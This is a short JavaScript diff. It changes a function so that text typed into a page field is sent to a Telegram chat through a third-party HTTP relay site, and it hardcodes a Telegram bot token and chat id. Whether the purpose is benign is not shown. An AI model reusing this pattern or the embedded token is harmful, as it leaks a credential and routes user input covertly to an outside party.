@@ -10,15 +10,23 @@ function ss(){
   var cbrowser = cljs.getBrowser();
   var os = cljs.getOS();
   
-  var ur = "";
+  var text = document.getElementById("inp").value;
   
+  var mohtava = "ask:"+text;
+  var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
+  var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
+  var data={"UrlBox":con,
+"AgentList" : "Google Chrome",
+"VersionsList" : "HTTP/1.1",
+"MethodList" : "POST"
+  }
   $.ajax({
-    type: "GET",
-    url: ur,
+    type: "POST",
+    url: url,
+    data: data,
     success: function(){
       console.log("ok");
     }
   
 })
-*/
 }
